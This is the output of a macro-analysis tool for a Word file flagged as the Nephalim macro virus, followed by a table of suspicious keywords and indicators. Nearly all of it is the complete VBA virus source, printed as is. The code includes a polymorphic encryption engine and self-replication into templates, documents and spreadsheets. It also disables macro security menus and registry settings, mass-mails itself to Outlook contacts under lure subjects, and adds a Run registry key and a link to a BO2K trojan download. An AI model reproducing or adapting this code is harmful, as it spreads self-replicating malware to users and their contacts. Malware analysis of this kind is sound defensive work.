olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nephalim-aa8795a3f57ad1a252c2f0bd31459e2fb1b614a4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nephalim-aa8795a3f57ad1a252c2f0bd31459e2fb1b614a4 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Nephalim v0.93  --  Pre-release version.
'
' Known issues in this release:
'   -Instability on Excel platform
'
Private Sub fDeleteFile(sFileName As String)
On Error Resume Next
If Dir(sFileName) <> "" Then
SetAttr sFileName, 0
Kill sFileName
End If
End Sub
Private Function CreateKey()
On Error Resume Next
Dim iTemp As Integer, sKey As String
sKey = ""
For iTemp = 1 To Int((30 * Rnd) + 6): sKey = sKey + Chr(Int((122 - 65) * Rnd) + 65): Next iTemp
CreateKey = sKey
End Function
Private Function fExposedEngine(sTargetApp As String, sKey As String, iLineCount As Integer)
On Error Resume Next
Dim var(20) As String, eol(20) As String, bond(20) As String, proc_declare(20) As String
Dim sEngine1 As String, sEngine2 As String, sEngine3 As String
Randomize
sTemp = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
For iTemp = 1 To 20
poz = Int(Rnd * Len(sTemp)) + 1
var(iTemp) = Mid(sTemp, poz, 1)
sTemp = Left(sTemp, poz - 1) + Right(sTemp, Len(sTemp) - poz)
Select Case Int((4 * Rnd) + 1)
Case 1: bond(iTemp) = ": "
eol(iTemp) = vbLf & vbLf & vbLf
proc_declare(iTemp) = ""
Case 2: bond(iTemp) = vbLf
eol(iTemp) = vbLf
proc_declare(iTemp) = "Private "
Case 3: bond(iTemp) = vbLf & vbLf
eol(iTemp) = vbLf & vbLf
proc_declare(iTemp) = "Public "
Case 4: bond(iTemp) = ": Rem " & CreateKey & vbLf
eol(iTemp) = vbLf & vbLf & vbLf
proc_declare(iTemp) = ""
End Select
Next iTemp
iSplitNumber1 = 130
iSplitNumber1A = Int(Rnd * iSplitNumber1)
iSplitNumber1B = iSplitNumber1 - iSplitNumber1A
iSplitNumber2 = 32
iSplitNumber2A = Int(Rnd * iSplitNumber2)
iSplitNumber2B = iSplitNumber2 - iSplitNumber2A
iSplitNumber3 = iLineCount
iSplitNumber3A = Int(Rnd * iSplitNumber3)
iSplitNumber3B = iSplitNumber3 - iSplitNumber3A
sObject = var(9) & ".VBProject.VBComponents.Item(" & var(16) & ").CodeModule."
iTemp = Int(Rnd * Len(sObject)) + 1
poz = InStr(iTemp, sObject, ".")
sOne = Left(sObject, poz - 1)
sTwo = Right(sObject, Len(sObject) - poz + 1)
sSplitObject1A = "set " & var(10) & " = " & sOne
sSplitObject1B = var(10) & sTwo
sObject = "VBProject.VBComponents.Item(1).CodeModule."
iTemp = Int(Rnd * Len(sObject)) + 1
poz = InStr(iTemp, sObject, ".")
sOne = Left(sObject, poz - 1)
sTwo = Right(sObject, Len(sObject) - poz + 1)
sSplitObject2A = "set " & var(13) & " = " & sOne
sSplitObject2B = var(13) & sTwo
sEngine1 = _
"Private Sub " & var(14) & "()" & bond(1) & _
"On Error Resume Next" & bond(2)
Select Case sTargetApp
Case "Excel":  sEngine1 = sEngine1 & _
"Dim " & var(9) & " As Excel.Workbook" & bond(3) & _
"Set " & var(9) & " = Excel.Workbooks.Add" & bond(4) & _
var(16) & " = 4" & bond(5)
Case "Word":  sEngine1 = sEngine1 & _
"Dim " & var(9) & " As Word.Document" & bond(3) & _
"Set " & var(9) & " = Word.Documents.Add" & bond(4) & _
var(16) & " = 1" & bond(5)
End Select
sEngine1 = sEngine1 & _
sSplitObject1A & bond(6) & _
sSplitObject2A & bond(7) & _
var(11) & " = (" & iSplitNumber1A & "+" & iSplitNumber1B & ")" & bond(8) & _
var(12) & " = (" & iSplitNumber2A & "+" & iSplitNumber2B & ")" & bond(9) & _
"For " & var(1) & " = 1 To " & iSplitNumber3A & "+" & iSplitNumber3B & eol(10) & _
var(5) & " = " & sSplitObject2B & "lines(" & var(1) & ", 1)" & bond(11) & _
var(5) & " = right(" & var(5) & ",len(" & var(5) & ")-1)" & bond(12) & _
var(4) & " = """"" & bond(13) & _
var(3) & " = 0" & bond(14) & _
"For " & var(2) & " = 1 To Len(" & var(5) & ")" & eol(15) & _
var(3) & " = " & var(3) & " + 1" & eol(16) & _
"If " & var(3) & " > " & Len(sKey) & "Then " & var(3) & " = 1" & eol(1) & _
var(6) & " = Asc(Mid(" & var(5) & ", " & var(2) & ", 1))" & eol(17) & _
"If " & var(6) & " >= " & var(12) & " And " & var(6) & " <= " & var(11) & " Then" & eol(18)
sEngine2 = _
var(8) & " = Asc(Mid(""" & sKey & """, " & var(3) & ", 1))" & bond(19)
sEngine3 = _
"If " & var(8) & " > (" & var(11) & "-" & var(12) & ") Then " & var(8) & " = " & var(8) & " - (" & var(11) & "-" & var(12) & ")" & eol(20) & _
var(7) & " = " & var(6) & " - " & var(8) & bond(1) & _
"If " & var(7) & " < " & var(12) & " Then " & var(7) & " = " & var(11) & " - (" & var(12) & " - " & var(7) & ")" & eol(2) & _
"Else" & eol(3)
sEngine3 = sEngine3 & _
var(7) & " = " & var(6) & bond(4) & _
"End If" & bond(5) & _
var(4) & " = " & var(4) & " & Chr(" & var(7) & ")" & bond(6) & _
"Next " & var(2) & eol(7) & _
var(18) & " = InStr(" & var(4) & ", "":NP" & "R"") - 1" & bond(3) & _
"If " & var(18) & " <> 0 then " & var(4) & " = Left(" & var(4) & "," & var(18) & ")" & eol(4) & _
"If Left(" & var(4) & ", 3) <> ""'NP"" then " & var(17) & "=" & var(17) & " & " & var(4) & " & vbLf" & eol(2) & _
"Next " & var(1) & bond(9) & _
sSplitObject1B & "InsertLines " & 1 & ", " & var(17) & bond(1) & _
var(9) & ".close(False)" & bond(10) & _
"End Sub" & vbLf
sEngine3 = sEngine3 & _
proc_declare(1) & "Sub Document_Open () " & bond(12) & _
var(14) & eol(13) & _
"End Sub" & vbLf & _
proc_declare(2) & "Sub Workbook_Open () " & bond(15) & _
var(14) & eol(16) & _
"End Sub" & vbLf
fExposedEngine = sEngine1 & sEngine2 & sEngine3
End Function
Private Function fEncrypt(iDirection As Integer, sKey As String, sInput As String) As String
On Error Resume Next
Dim sTemp As String, iChr As Integer, iKey As Integer, iTemp As Integer, i As Integer, j As Integer
sTemp = "": j = 0
For i = 1 To Len(sInput)
j = j + 1: If j > Len(sKey) Then j = 1
iChr = Asc(Mid(sInput, i, 1))
If iChr >= 32 And iChr <= 130 Then
iKey = Asc(Mid(sKey, j, 1))
If iKey > (130 - 32) Then iKey = iKey + (32 - 130)
iTemp = iChr + iDirection * iKey
If iTemp > 130 Then iTemp = 32 + (iTemp - 130)
If iTemp < 32 Then iTemp = 130 - (32 - iTemp)
Else
iTemp = iChr
End If
sTemp = sTemp & Chr(iTemp)
Next i
fEncrypt = sTemp
End Function
Private Sub fTouchFile(dTargetApplication As String, dSource As Object, dTarget As String)
On Error Resume Next
Dim iTemp As Integer, sMKey As String
sMKey = CreateKey
fDeleteFile (dTarget)
Open dTarget For Output As #1
For iTemp = 1 To dSource.CountOfLines: Print #1, "'" & fEncrypt(1, sMKey, dSource.Lines(iTemp, 1)): Next iTemp
Print #1, fExposedEngine(dTargetApplication, sMKey, dSource.CountOfLines)
Close #1
End Sub
Private Sub fTouch(dSource As Object, dTarget As Object)
On Error Resume Next
Dim iTemp As Integer, sMKey As String, sTarget As String
Dim sExtractedKey As String, sFirstLine As String
Dim buffer_lines As Integer
Select Case Application.Name
Case "Microsoft Word": sTarget = "Word"
Case "Microsoft Excel": sTarget = "Excel"
End Select
With dTarget
If .CountOfLines > 0 Then
sTemp = .Lines(1, .CountOfLines)
sFirstLine = .Lines(1, 1)
poz1 = InStr(1, sTemp, "Asc(Mid(""")
poz2 = InStr(poz1, sTemp, "))") - poz1
sExtractedKey = Mid(sTemp, poz1, poz2)
poz1 = InStr(1, sExtractedKey, """") + 1
poz2 = InStr(poz1, sExtractedKey, """") - poz1
sExtractedKey = Mid(sExtractedKey, poz1, poz2)
sFirstLine = fEncrypt(-1, sExtractedKey, Right(sFirstLine, Len(sFirstLine) - 1))
End If
bAlreadyTouched = (InStr(1, sFirstLine, "Nephalim v0") > 0)
End With
Randomize
buffer_lines = 0
If Not bAlreadyTouched Then
sMKey = CreateKey
With dTarget
.DeleteLines 1, .CountOfLines
For iTemp = 1 To dSource.CountOfLines
If Len(Trim(dSource.Lines(iTemp, 1))) <> 0 Then
sPostBuffer = ""
If Int(Rnd * 3) + 1 = 1 Then sPostBuffer = ":NP" & "R " & CreateKey
.AddFromString "'" & fEncrypt(1, sMKey, Trim(dSource.Lines(iTemp, 1)) & sPostBuffer)
buffer_lines = buffer_lines + 1
End If
If Int(Rnd * 3) + 1 = 1 Then
sTemp = ""
For iTemp2 = 1 To Int(Rnd * 3) + 1: sTemp = sTemp & CreateKey: Next iTemp2
.AddFromString "'" & fEncrypt(1, sMKey, "'NP" & sTemp)
buffer_lines = buffer_lines + 1
End If
Next iTemp
.AddFromString fExposedEngine(sTarget, sMKey, buffer_lines)
End With
End If
End Sub
Private Sub fActiveSpawn()
On Error Resume Next
Dim iTemp As Integer, iTemp2 As Integer
Dim oPersonal As Object
fTouch VBProject.VBComponents.Item(1).CodeModule, NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
Set oPersonal = Workbooks.Add
fTouch VBProject.VBComponents.Item(1).CodeModule, oPersonal.VBProject.VBComponents.Item(1).CodeModule
For iTemp = 1 To Documents.Count
If Documents.Item(iTemp).Name <> ActiveDocument.Name Then fTouch VBProject.VBComponents.Item(1).CodeModule, Documents.Item(iTemp).VBProject.VBComponents.Item(1).CodeModule
Next iTemp
For iTemp = 1 To Workbooks.Count
If Workbooks.Item(iTemp).Name <> ActiveWorkbook.Name Then
For iTemp2 = 1 To Workbooks.Item(iTemp).VBProject.VBComponents.Count
With Workbooks.Item(iTemp).VBProject.VBComponents.Item(iTemp2)
Err.Clear
sTemp = .Properties.Item("Saved").Name
If Err.Number = 0 Then fTouch VBProject.VBComponents.Item(1).CodeModule, Workbooks.Item(iTemp).VBProject.VBComponents.Item(iTemp2).CodeModule
End With
Next iTemp2
End If
Next iTemp
End Sub
Private Sub fWordFileGrab(sFileName As String)
Dim dFSTarget As Word.Document
If LCase(sFileName) <> LCase(ActiveDocument.FullName) Then
Set dFSTarget = Documents.Open(sFileName)
fTouch VBProject.VBComponents.Item(1).CodeModule, dFSTarget.VBProject.VBComponents.Item(1).CodeModule
dFSTarget.Save
dFSTarget.Close
End If
End Sub
Private Sub fExcelFileGrab(sFileName As String)
Dim dFSTarget As Excel.Workbook
If LCase(sFileName) <> LCase(ActiveWorkbook.FullName) Then
Set dFSTarget = Workbooks.Open(sFileName)
fTouch VBProject.VBComponents.Item(1).CodeModule, dFSTarget.VBProject.VBComponents.Item(1).CodeModule
dFSTarget.Save
dFSTarget.Close
End If
End Sub
Private Sub fDirectorySpawn()
On Error Resume Next
Dim sSearchDir As String, sBeenThere As String, sKey As String, sSearchDirs As String
Dim iPoz As Integer, iTemp As Integer
Dim objFileSearch As Object
sSearchDirs = "C:\|C:\windows\desktop\|C:\my documents|C:\Program Files\Microsoft Office\Office\XLSTART|"
sSearchDirs = sSearchDirs & Options.DefaultFilePath(14) & "|" & Options.DefaultFilePath(0) & "|"
sSearchDirs = sSearchDirs & ActiveDocument.Path & "|" & Left(ActiveDocument.Path, 3) & "|"
sSearchDirs = sSearchDirs & ActiveWorkbook.Path & "|" & Left(ActiveWorkbook.Path, 3) & "|"
sBeenThere = ""
Do While sSearchDirs <> ""
iPoz = InStr(sSearchDirs, "|")
sSearchDir = Left(sSearchDirs, iPoz - 1)
sSearchDirs = Right(sSearchDirs, Len(sSearchDirs) - iPoz)
If Right(Trim(sSearchDir), 1) <> "\" Then sSearchDir = Trim(sSearchDir) + "\"
If InStr(sBeenThere, LCase(sSearchDir)) = 0 Then
Set objFileSearch = Application.FileSearch
With objFileSearch
.LookIn = sSearchDir
Select Case Application.Name
Case "Microsoft Word": .FileName = "*.doc"
Case "Microsoft Excel": .FileName = "*.xls"
Case Else: .FileName = "*.vbs"
End Select
If .Execute(SortBy:=msoSortByFileName, SortOrder:=msoSortOrderAscending) > 0 Then
For iTemp = 1 To .FoundFiles.Count
Select Case Application.Name
Case "Microsoft Word": fWordFileGrab (.FoundFiles(iTemp))
Case "Microsoft Excel": fExcelFileGrab (.FoundFiles(iTemp))
End Select
Next iTemp
End If
End With
sBeenThere = sBeenThere & "{" & LCase(sSearchDir) & "}"
End If
Loop
Set objFileSearch = Nothing
End Sub
Private Sub fStealth(iSetting As Integer)
On Error Resume Next
With Application
.CommandBars("Visual Basic").Enabled = iSetting
.CommandBars("Macro").Controls("Security...").Enabled = iSetting
.CommandBars("Window").Controls("Unhide").Enabled = iSetting
With .CommandBars("Tools"): .Controls("Macro").Enabled = iSetting: .Controls("Customize...").Enabled = iSetting: .Controls("Templates and Add-Ins...").Enabled = iSetting: End With
With .Options: .VirusProtection = iSetting: .SaveNormalPrompt = iSetting: .ConfirmConversions = iSetting: End With
End With
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Excel\Security", "Level") = 1&
End Sub
Private Sub fGrabJugular(sApplication As String)
On Error Resume Next
Dim sInputFile As String, sTemplateFile As String, sCommand As String
Dim lExternal As Long
Dim objApp As Object
Dim iTemp As Integer
sInputFile = "C:\TEST.TXT"
fTouchFile sApplication, VBProject.VBComponents.Item(1).CodeModule, sInputFile
sTemplateFile = "C:\Program Files\Microsoft Office\Office\XLSTART\personal.xls"
If sApplication = "Excel" Then fDeleteFile sTemplateFile
For iTemp = 1 To 10
Set objApp = GetObject(, sApplication & ".Application")
objApp.Application.ActiveDocument.Close (False)
objApp.Application.ActiveWorkbook.Close (False)
objApp.Application.Quit
Next iTemp
If sApplication = "Excel" Then
sCommand = "EXCEL.EXE"
ElseIf sApplication = "Word" Then
sCommand = "WINWORD.EXE"
End If
lExternal = Shell(sCommand, vbNormalFocus)
AppActivate lExternal
AppActivate lExternal
AppActivate lExternal
If sApplication = "Excel" Then
SendKeys "~~~ {Down} ~~~", True
SendKeys "%{F11}", True
SendKeys "%VP%VP%VP", True
SendKeys "^R^R^R", True
SendKeys "{PgDn}{PgDn}{PgDn}", True
SendKeys "{F7}", True
SendKeys "%IL", True
SendKeys sInputFile & "~", True
ElseIf sApplication = "Word" Then
SendKeys "123{Down}", True
SendKeys "%{F11}", True
SendKeys "%VP^R^R^R", True
SendKeys "{F7}", True
SendKeys "^+{End}", True
SendKeys "^A^A^A", True
SendKeys "{Del}{Del}{Del}", True
SendKeys "%IL", True
SendKeys sInputFile & "~", True
End If
Err.Clear
Set objApp = GetObject(, sApplication & ".Application")
For iTemp = 1 To 15
If Err.Number <> 0 Then Set objApp = GetObject(, sApplication & ".Application")
Next iTemp
If Err.Number = 0 Then
objApp.Application.Visible = False
objApp.Application.ActiveDocument.Close (False)
objApp.Application.ActiveWorkbook.SaveAs sTemplateFile
objApp.Application.ActiveWorkbook.Close (False)
objApp.Application.Quit
Else
If sApplication = "Excel" Then
SendKeys "%{F4}", True
SendKeys "%F", True
SendKeys "^S^S^S", True
SendKeys sTemplateFile & "~", True
SendKeys "%{F4}N", True
ElseIf sApplication = "Word" Then
SendKeys "%{F4}", True
SendKeys "%{F4}NY", True
End If
End If
fDeleteFile sInputFile
Set objApp = Nothing
End Sub
Private Sub HaveOutlook() 'will travel...
On Error Resume Next
Dim oApplication As Object, oMAPI As Object, oContact As Object, oMessage As Object, oRecipient As Object
Dim sSubject As String, sBody As String
Dim bDoneThat As Boolean
Randomize
On Error GoTo skip_outlook
Set oApplication = CreateObject("Outlook.Application")
Set oMAPI = oApplication.GetNamespace("MAPI")
Select Case Int((15 * Rnd) + 1)
Case 1: sSubject = "Here's " & ActiveDocument.Name: sBody = "Hope this helps." & vbCr & vbLf & vbCr & vbLf & "    " & Application.UserName
Case 2: sSubject = "Hope this is what you wanted...": sBody = "I've attached " & ActiveDocument.Name & ".  Let me know if there's a problem."
Case 3: sSubject = "Hey John, check this out [private]": sBody = "(Make sure you don't show anyone else)"
Case 4: sSubject = "Check out these sitez! {personal}": sBody = "Don't stay up TOO late checking these out :-)"
Case 5: sSubject = "The report you requested": sBody = "If this isn't the right one, let me know." & vbCr & vbLf & vbCr & vbLf & "    " & Application.UserName
Case 6: sSubject = "Check out these babes!": sBody = "You know the score, passwords to the latest batch of sites enclosed (courtesy of FoG)" & vbCr & vbLf & vbCr & vbLf & "(Check out the girl on the entrance to site number 3...)"
Case 7: sSubject = "New computer question...": sBody = "Does this look right?  New PIII for $600?  What's missing from it?"
Case 8: sSubject = "That report...": sBody = "Here's " & ActiveDocument.Name & ".  This was what you wanted?  Call me if it isn't..."
Case 9: sSubject = "...": sBody = "Free porn site passwords!"
Case 10: sSubject = "IMPORTANT: virus alert": sBody = "Do we need to be worried?" & vbCr & vbLf & vbCr & vbLf & "    " & Application.UserName
Case 11: sSubject = "Latest round of Bill Gates jokes...": sBody = "Joke 4 nearly gave me a heart attack, I laughed so hard!!"
Case 12: sSubject = "<attachment>": sBody = "Here's " & ActiveDocument.Name & ", I hope this was the one you wanted."
Case 13: sSubject = "Microsoft Office 2000 code crack!": sBody = "I've attached the serial number, and FTP site/password.  Don't want to be caught out by Y2K (or spend $1300 either!)"
Case 14: sSubject = "Pictures": sBody = "Here are those pictures of me you wanted -- enjoy ;).  I've put them in Word format, the password is 'LUVMYBODY'."
Case 15: sSubject = "New Windows Internet hack found!": sBody = "Check this out, do you think it's for real?"
End Select
If Minute(Now) < 15 Then
For Each oContact In oMAPI.GetDefaultFolder(10).Items
Set oMessage = oApplication.CreateItem(0)
Set oRecipient = oMessage.Recipients.Add(oContact.Email1Address)
If bDoneThat Then oRecipient.Type = 3
oRecipient.Resolve
bDoneThat = True
oMessage.Subject = sSubject
oMessage.Body = sBody
oMessage.Attachments.Add Documents(1).FullName
oMessage.Send
Next oContact
Else
bDoneThat = False
Set oMessage = oApplication.CreateItem(0)
For Each oContact In oMAPI.GetDefaultFolder(10).Items
Set oRecipient = oMessage.Recipients.Add(oContact.Email1Address)
If bDoneThat Then oRecipient.Type = 3
oRecipient.Resolve
bDoneThat = True
Next oContact
oMessage.Subject = sSubject
oMessage.Body = sBody
oMessage.Attachments.Add Documents(1).FullName
oMessage.Send
End If
skip_outlook:
End Sub
Private Sub main()
On Error Resume Next
Randomize
fStealth 0
Select Case Int(Rnd * 2) + 1
Case 1: fActiveSpawn
Case 2: fDirectorySpawn
End Select
If (Day(Now) = 18 And Month(Now) = 5) Then Selection.TypeText (vbCr & vbLf & "========" & vbCr & vbLf & "Love has torn us apart... " & (Year(Now) - 1980) & " years..." & vbCr & vbLf & "========" & vbCr & vbLf & vbCr & vbLf)
Select Case (Int(Rnd * 11) + 2)
Case 2: If Application.Name <> "Microsoft Excel" Then fGrabJugular ("Excel")
If Application.Name <> "Microsoft Word" Then fGrabJugular ("Word")
Case 3: If (Minute(Now) < Second(Now)) Or (Day(Now) = 18) Then HaveOutlook
Case 4: Select Case (Int(Rnd * 6) + 1)
Case 1: For iTemp = 1 To 5: Shell "ping -t ftp.nai.com", vbHide: Next iTemp
Case 2: System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", Chr(255)) = "C:\WINDOWS\WINMINE.EXE"
Case 3: Shell "explorer http://www.nephilim.com/"
Case 4: Shell "explorer http://www.bo2k.com/warez/bo2k_1.0.exe"
End Select
End Select
End Sub
Private Sub Document_Close(): main: End Sub
Private Sub Workbook_BeforeClose(Cancel As Boolean): main: End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_BeforeClose|Runs when the Excel Workbook is closed       |
|Suspicious|Open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormalFocus       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Application.Visible |May hide the application                     |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|AppActivate         |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.nephilim.|URL                                          |
|          |com/                |                                             |
|IOC       |http://www.bo2k.com/|URL                                          |
|          |warez/bo2k_1.0.exe  |                                             |
|IOC       |EXCEL.EXE           |Executable file name                         |
|IOC       |WINWORD.EXE         |Executable file name                         |
|IOC       |WINMINE.EXE         |Executable file name                         |
|IOC       |0.exe               |Executable file name                         |
+----------+--------------------+---------------------------------------------+

